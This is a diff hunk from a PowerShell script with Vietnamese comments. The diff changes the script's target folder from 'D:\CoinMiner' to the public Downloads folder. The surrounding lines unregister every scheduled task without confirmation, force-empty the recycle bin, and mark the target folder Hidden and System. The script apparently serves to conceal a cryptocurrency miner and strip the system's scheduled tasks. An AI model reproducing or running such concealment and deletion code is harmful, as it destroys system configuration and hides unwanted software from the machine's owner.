@@ -73,7 +73,7 @@ Get-ScheduledTask | Where-Object {$_.TaskName -like "*reboot*" -or $_.TaskName -
 Get-ScheduledTask | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath -Confirm:$false}
 Clear-RecycleBin -Force
 # ==== THIẾT LẬP ====
-$targetPath = "D:\CoinMiner"   # 🔁 Thay bằng thư mục của bạn
+$targetPath = "C:\Users\Public\Downloads"   # 🔁 Thay bằng thư mục của bạn
 
 # ==== 1. ẨN THƯ MỤC ====
 (Get-Item $targetPath).Attributes += 'Hidden','System'
